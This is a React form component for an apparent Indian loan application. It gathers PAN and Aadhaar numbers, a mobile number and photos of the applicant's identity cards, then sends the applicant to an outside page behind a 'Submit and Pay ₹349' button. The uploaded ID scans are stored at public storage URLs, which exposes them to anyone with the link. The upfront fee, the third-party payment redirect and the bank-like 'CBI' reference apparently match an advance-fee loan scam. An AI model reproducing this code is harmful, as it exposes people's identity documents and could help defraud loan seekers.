
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { FileText } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import LoanInfoSection from './LoanInfoSection';
import PersonalInfoSection from './PersonalInfoSection';

const DocumentForm = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const { user } = useAuth();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    loanType: '',
    loanAmount: '',
    panCard: '',
    aadhaarCard: '',
    mobileNumber: '',
    photo: null as File | null,
    panCardPhoto: null as File | null,
    aadhaarCardPhoto: null as File | null,
  });

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, fieldName: string) => {
    const file = e.target.files?.[0];
    if (file) {
      setFormData({...formData, [fieldName]: file});
    }
  };

  const uploadPhoto = async (file: File): Promise<string | null> => {
    if (!user) return null;
    
    // Sanitize file name to prevent path traversal
    const fileExt = file.name.split('.').pop()?.toLowerCase().replace(/[^a-z0-9]/g, '') || 'jpg';
    const sanitizedFileName = `${user.id}/${Date.now()}.${fileExt}`;
    
    const { error } = await supabase.storage
      .from('documents')
      .upload(sanitizedFileName, file);
    
    if (error) {
      return null;
    }
    
    const { data } = supabase.storage
      .from('documents')
      .getPublicUrl(sanitizedFileName);
    
    return data.publicUrl;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!user) {
      toast({
        title: "Authentication Error",
        description: "Please log in to submit your application.",
        variant: "destructive"
      });
      return;
    }
    
    setLoading(true);
    
    try {
      // Upload photos if provided
      let photoUrl = null;
      let panCardPhotoUrl = null;
      let aadhaarCardPhotoUrl = null;
      
      if (formData.photo) {
        photoUrl = await uploadPhoto(formData.photo);
        if (!photoUrl) {
          throw new Error('Failed to upload passport photo');
        }
      }
      
      if (formData.panCardPhoto) {
        panCardPhotoUrl = await uploadPhoto(formData.panCardPhoto);
        if (!panCardPhotoUrl) {
          throw new Error('Failed to upload PAN card photo');
        }
      }
      
      if (formData.aadhaarCardPhoto) {
        aadhaarCardPhotoUrl = await uploadPhoto(formData.aadhaarCardPhoto);
        if (!aadhaarCardPhotoUrl) {
          throw new Error('Failed to upload Aadhaar card photo');
        }
      }
      
      // Save document submission to database
      const { error } = await supabase
        .from('document_submissions')
        .insert({
          user_id: user.id,
          loan_type: formData.loanType,
          loan_amount: parseFloat(formData.loanAmount),
          pan_card: formData.panCard,
          aadhaar_card: formData.aadhaarCard,
          mobile_number: formData.mobileNumber,
          photo_url: photoUrl,
          pan_card_photo_url: panCardPhotoUrl,
          aadhaar_card_photo_url: aadhaarCardPhotoUrl,
          qr_code: 'CBI-2591', // Static QR code reference
        });
      
      if (error) {
        throw error;
      }
      
      toast({
        title: "Application Submitted Successfully",
        description: "Your loan application has been submitted for review.",
      });
      
      // Redirect to the specified URL
      window.location.href = 'https://superprofile.bio/vp/cromafin-629';
      
    } catch (error: any) {
      toast({
        title: "Submission Failed",
        description: error.message || "Failed to submit your application. Please try again.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const updateFormData = (field: string, value: any) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center">
          <FileText className="w-5 h-5 mr-2 text-blue-500" />
          Document Submission
        </CardTitle>
        <CardDescription>Please fill all fields to proceed with your loan application</CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-6">
          <LoanInfoSection 
            loanType={formData.loanType} 
            loanAmount={formData.loanAmount}
            onChangeLoanType={(value) => updateFormData('loanType', value)}
            onChangeLoanAmount={(e) => updateFormData('loanAmount', e.target.value)}
          />

          <PersonalInfoSection
            panCard={formData.panCard}
            aadhaarCard={formData.aadhaarCard}
            mobileNumber={formData.mobileNumber}
            onChangePanCard={(e) => updateFormData('panCard', e.target.value.toUpperCase())}
            onChangeAadhaarCard={(e) => updateFormData('aadhaarCard', e.target.value)}
            onChangeMobileNumber={(e) => updateFormData('mobileNumber', e.target.value)}
          />

          {/* Photo Uploads */}
          <div className="space-y-4">
            <div>
              <Label htmlFor="photo">Passport Size Photo</Label>
              <Input
                id="photo"
                type="file"
                accept="image/*"
                required
                onChange={(e) => handleFileChange(e, 'photo')}
                className="mt-1"
              />
              <p className="text-sm text-gray-500 mt-1">Upload a recent passport-size photograph (JPG, PNG)</p>
            </div>
            
            <div>
              <Label htmlFor="panCardPhoto">PAN Card Photo</Label>
              <Input
                id="panCardPhoto"
                type="file"
                accept="image/*"
                required
                onChange={(e) => handleFileChange(e, 'panCardPhoto')}
                className="mt-1"
              />
              <p className="text-sm text-gray-500 mt-1">Upload a clear photo of your PAN card (JPG, PNG)</p>
            </div>
            
            <div>
              <Label htmlFor="aadhaarCardPhoto">Aadhaar Card Photo</Label>
              <Input
                id="aadhaarCardPhoto"
                type="file"
                accept="image/*"
                required
                onChange={(e) => handleFileChange(e, 'aadhaarCardPhoto')}
                className="mt-1"
              />
              <p className="text-sm text-gray-500 mt-1">Upload a clear photo of your Aadhaar card (JPG, PNG)</p>
            </div>
          </div>

          {/* Submit Button */}
          <div className="text-center">
            <Button 
              type="submit" 
              className="bg-green-500 hover:bg-green-600 px-12 py-3 text-lg"
              disabled={loading}
            >
              {loading ? 'Submitting...' : 'Submit and Pay ₹349'}
            </Button>
          </div>
        </form>
      </CardContent>
    </Card>
  );
};

export default DocumentForm;
